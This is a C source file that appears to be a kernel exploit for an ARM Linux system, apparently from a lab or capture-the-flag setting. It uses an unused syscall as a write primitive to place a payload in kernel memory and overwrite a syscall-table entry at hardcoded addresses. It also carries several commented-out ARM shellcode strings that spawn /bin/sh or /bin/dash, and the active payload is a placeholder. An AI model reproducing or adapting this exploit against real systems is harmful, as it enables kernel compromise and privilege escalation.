// Fucks up syscalling in the system by overwirting the syscall table
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#define SYS_CALL_TABLE 0x8000e348
#define NR_SYS_UNUSED 223
#define buffer_size 400
#define sys_read 0x800BEB34
#define pc_offset 16
#define bss_start 0x804e3b20

/*
Memory: 57292K/112640K available (3579K kernel code, 166K rwdata, 1020K rodata, 203K init, 138K bss, 55348K reserved)
Virtual kernel memory layout:
    vector  : 0xffff0000 - 0xffff1000   (   4 kB)
    fixmap  : 0xfff00000 - 0xfffe0000   ( 896 kB)
    vmalloc : 0x87000000 - 0xff000000   (1920 MB)
    lowmem  : 0x80000000 - 0x86e00000   ( 110 MB)
    modules : 0x7f000000 - 0x80000000   (  16 MB)
      .text : 0x80008000 - 0x80485f40   (4600 kB)
      .init : 0x80486000 - 0x804b8c80   ( 204 kB)
      .data : 0x804ba000 - 0x804e3b20   ( 167 kB)
       .bss : 0x804e3b20 - 0x805065d0   ( 139 kB)
*/
/*
char * SC =      "\x01\x30\x8f\xe2"
                "\x13\xff\x2f\xe1"
                "\x78\x46\x0e\x30"
                "\x01\x90\x49\x1a"
                "\x92\x1a\x08\x27"
                "\xc2\x51\x03\x37"
                "\x01\xdf\x2f\x62"
                "\x69\x6e\x2f\x2f"
                "\x73\x68";
*//*
char * SC = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x1a\x0a\x1c\x42\x72\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x59\xc0\x46";
*/
/*
char * SC = "\x01\x30\x8f\xe2"
            "\x13\xff\x2f\xe1"
            "\x78\x46\x08\x30"
            "\x49\x1a\x92\x1a"
            "\x0b\x27\x01\xdf"
            "\x2f\x62\x69\x6e"
            "\x2f\x73\x68";
*/

char * SC = "AAAA";
int main()
{
	int * info = (int *)malloc(buffer_size);
    char * payload = (char *)malloc(strlen(SC));
    int i = 0;
    memcpy(payload, SC, strlen(SC));
    printf("[*] Addr of info: %p\n", info);
    printf("[*] Addr of payload %p\n", payload);
    sleep(1);

    // Write to bss the shellcode
    syscall(223, payload, (char *)(unsigned int *)bss_start);

    // Write to where pc will be bss_start to jump to shellcode
    info[0] = bss_start;
    syscall(223, (char *)info, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset)); // override!
    
    // Jump to shellcode!
    syscall(223,"aaaa",(char *)info);
}